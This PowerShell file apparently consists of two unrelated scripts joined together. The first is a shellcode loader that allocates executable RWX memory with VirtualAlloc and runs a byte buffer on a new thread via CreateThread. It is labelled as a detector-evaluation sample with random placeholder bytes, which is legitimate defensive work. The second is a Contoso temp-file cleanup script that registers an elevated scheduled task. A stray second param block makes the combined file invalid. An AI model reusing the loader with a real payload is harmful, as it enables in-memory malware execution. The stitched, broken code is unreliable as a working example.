
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xc6, 0xe2, 0x14, 0xd4, 0xe6, 0x77, 0x47, 0x2a, 0xea, 0x97, 0xeb, 0xeb, 0x8b, 0xed, 0x24, 0x5a,
    0x3a, 0x3c, 0xd3, 0x25, 0xb8, 0x11, 0x9d, 0xf3, 0x4a, 0x70, 0xad, 0x11, 0x29, 0xf0, 0x3b, 0xc6,
    0xf7, 0x95, 0xfd, 0x06, 0x5f, 0x3d, 0x3e, 0xaf, 0xf5, 0x27, 0x37, 0xa9, 0xe3, 0xe4, 0xfa, 0xf9,
    0x97, 0x90, 0x98, 0x63, 0x5b, 0xba, 0x71, 0x71, 0x36, 0x1f, 0xda, 0xb9, 0x20, 0x00, 0x39, 0x87,
    0x3d, 0x09, 0xac, 0xd8, 0xcc, 0xae, 0x2e, 0x27, 0x6f, 0xf5, 0x6c, 0x38, 0xf8, 0xef, 0xc5, 0x08,
    0x65, 0xe6, 0xd8, 0x9e, 0x82, 0x2f, 0x47, 0x30, 0x47, 0xb3, 0x72, 0x4a, 0x95, 0x61, 0x31, 0x40,
    0xf0, 0x10, 0xb7, 0x16, 0xd1, 0x0e, 0xaf, 0xf8, 0xcb, 0x0b, 0x31, 0x75, 0x7d, 0x45, 0xb0, 0x35,
    0xb5, 0xc0, 0xb7, 0x2a, 0x95, 0x58, 0x0a, 0xd4, 0x3b, 0x98, 0xfc, 0x8e, 0x1a, 0x23, 0xaf, 0x8e,
    0x79, 0x57, 0x47, 0x60, 0x01, 0x0e, 0x88, 0x77, 0x64, 0x1d, 0x9a, 0xa1, 0x19, 0x3a, 0x6e, 0x22,
    0xbe, 0x11, 0xf9, 0x22, 0x0a, 0x45, 0xb0, 0x23, 0xc6, 0x3e, 0xd0, 0x19, 0xf7, 0x33, 0x31, 0x7e,
    0x5a, 0xad, 0x7a, 0x2e, 0x50, 0x6f, 0x03, 0x74, 0x35, 0xfc, 0x51, 0x9b, 0xc2, 0xdd, 0xa6, 0x53,
    0x6b, 0xf3, 0x28, 0x52, 0x86, 0xaa, 0xc7, 0x67, 0x0d, 0xcb, 0x19, 0xd9, 0xd1, 0x24, 0xad, 0xce,
    0x82, 0x05, 0x40, 0x84, 0x02, 0xe7, 0xcf, 0x24, 0xd5, 0x7f, 0x22, 0x47, 0x14, 0x74, 0xd6, 0xa3,
    0xbd, 0xcc, 0xa7, 0x68, 0xea, 0xe4, 0x5d, 0x2f, 0x68, 0x7b, 0x22, 0xc6, 0x2f, 0x05, 0x2c, 0x4b,
    0xa5, 0x86, 0x62, 0x0b, 0x56, 0x26, 0xb6, 0x87, 0x3e, 0x1d, 0xc0, 0xe9, 0x1b, 0xe4, 0x13, 0x8f,
    0xdf, 0x38, 0x8b, 0x40, 0x17, 0xe0, 0x68, 0xe8, 0x8c, 0x2b, 0xd0, 0x5d, 0xd0, 0x25, 0x5f, 0xec,
    0xdc, 0x3a, 0x95, 0xfc, 0x04, 0x1c, 0x0a, 0x59, 0x0e, 0xcc, 0x4a, 0x40, 0x48, 0xa8, 0x92, 0x3e,
    0x94, 0x28, 0xf8, 0x13, 0x6a, 0x08, 0x5d, 0xa1, 0xe4, 0x63, 0x72, 0x8c, 0x53, 0x06, 0xb6, 0x0e,
    0x4d, 0x81, 0xc1, 0x93, 0x28, 0x8b, 0xcd, 0x92, 0xb2, 0x48, 0xdf, 0x46, 0x4f, 0xf0, 0x5e, 0x73,
    0xa6, 0xe8, 0xd8, 0x6b, 0x2d, 0x23, 0x78, 0x0a, 0x8e, 0xa9, 0x35, 0x77, 0x40, 0xaa, 0x5e, 0xf5,
    0x9d, 0xe7, 0xab, 0x51, 0x20, 0xc4, 0xb6, 0x0a, 0xbe, 0x06, 0xd9, 0x00, 0xc6, 0x2f, 0x91, 0xdb,
    0x0f, 0x38, 0xff, 0xaf, 0xab, 0x60, 0x2f, 0x23, 0x9f, 0xea, 0xdf, 0xf4, 0xfe, 0xa6, 0x80, 0x57,
    0xdc, 0xe3, 0x47, 0x53, 0xc4, 0x7a, 0x38, 0x42, 0xe7
)

$HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 1772)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias("ScratchPath")]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 30,
    [int]$MinSizeMB = 5,

    [string]$LogPath = 'C:\Logs\temp-cleanup-2026-05-11.log',
    [switch]$DryRun
)

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-LogEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-LogEntry -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "05:15"
Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@internal.corp'

Send-MailMessage -To $MailTo -From 'ops@internal.corp' -Subject "TEMP cleanup summary" -Body "The scheduled TEMP sweep completed. See the JSON report on the host." -SmtpServer 'smtp.contoso.com' -Port 587

& Write-LogEntry -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
